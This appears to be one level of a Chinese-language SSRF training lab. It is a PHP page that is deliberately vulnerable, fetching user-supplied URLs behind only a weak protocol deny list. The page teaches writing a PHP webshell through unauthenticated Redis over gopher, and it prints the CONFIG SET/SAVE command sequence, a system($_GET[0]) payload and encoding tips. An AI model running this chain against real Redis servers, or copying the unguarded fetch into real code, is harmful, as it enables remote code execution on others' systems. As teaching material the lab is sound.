<?php
require __DIR__ . '/common.php';

/**
 * L4：同一个洞，第二种利用。
 *
 * L3 是「读」，L4 是「写」——把 Redis 的落盘目录改到 web 根目录下，
 * 存一个 .php 文件，SAVE 一下，shell 就躺在网站目录里了。
 *
 * 前提和 L3 完全一样：redis 未授权 + 同一个 gopher 注入点。
 * 唯一区别是这次要多条命令连发（gopher 一次 TCP 连接能塞任意多行）。
 */

$url = isset($_GET['url']) ? trim($_GET['url']) : '';
$err = null;
$res = null;

$deny = ['file://', 'dict://', 'ftp://', 'php://', 'data://', 'zlib://'];

if (isset($_GET['url'])) {
    if ($url === '') {
        $err = '给个 URL';
    } else {
        foreach ($deny as $d) {
            if (stripos($url, $d) !== false) {
                $err = '禁止的协议：' . $d;
                break;
            }
        }
    }
    if ($err === null) {
        $res = http_fetch($url, false, 8);
    }
}

$out = '';
if ($err) {
    $out .= '<div class="err">' . h($err) . '</div>';
}
if ($res) {
    $out .= render_response($res);
}

$body = '<h1>L4 · 打 Redis 写 WebShell<span class="tag">same-hole</span></h1>'
      . '<p class="sub">同一个 SSRF，把「读」换成「写」，就从小问题变大问题。</p>'

      . '<h2>思路</h2>'
      . '<p>Redis 有两个配置项，天生就是用来写文件的：</p>'
      . '<pre class="cmd">'
      . h("CONFIG SET dir /var/www/html/uploads\nCONFIG SET dbfilename shell.php\nSET payload \"<?php system(\$_GET[0]); ?>\"\nSAVE")
      . '</pre>'
      . '<p><code>SAVE</code> 会把当前内存快照写到 <code>dir/dbfilename</code>。'
      . '文件名是我们控制的，目录也是 —— 于是 RDB 文件变成了 webshell。</p>'
      . '<p>RDB 是二进制格式，写出来的文件前面会带一堆乱码，但 PHP 只在 <code>&lt;?php</code> 之后才开始解析，'
      . '所以前面的垃圾不影响执行。</p>'

      . '<h2>目标</h2>'
      . '<p>web 根目录是 <code>/var/www/html</code>，上传目录 <code>uploads/</code> 权限是 777。'
      . 'flag 在 web 容器的 <code>/flag_l4</code>。</p>'
      . '<p>拿到 shell 之后直接 <code>?0=cat /flag_l4</code>。</p>'

      . url_form('l4.php', $url, 'gopher://redis:6379/_...') . $out

      . '<h2>拼包要点</h2>'
      . '<ul class="hint">'
      . '<li>一次 gopher 请求 = 一次 TCP 连接 = 可以连发多条命令，中间用 <code>%0D%0A</code> 分隔。</li>'
      . '<li>Redis 收到多余的空行会报 <code>-ERR</code>，但前面的命令已经执行了，不影响结果。</li>'
      . '<li>PHP 代码里含 <code>$</code>、<code>[</code>、<code>]</code>、<code>&lt;</code>、<code>&gt;</code>，'
      . 'URL 编码时统统要转义，否则会被 curl 当成 URL 结构。</li>'
      . '<li>如果 <code>SAVE</code> 报权限错误，说明 <code>dir</code> 没设成功 —— 换 <code>/tmp</code> 先验证命令通不通。</li>'
      . '<li>脚本在 <code>poc/04_redis_webshell.py</code>，建议先自己手搓一遍再对答案。</li>'
      . '</ul>';

page('l4', 'L4 · 打 Redis 写 WebShell', $body);
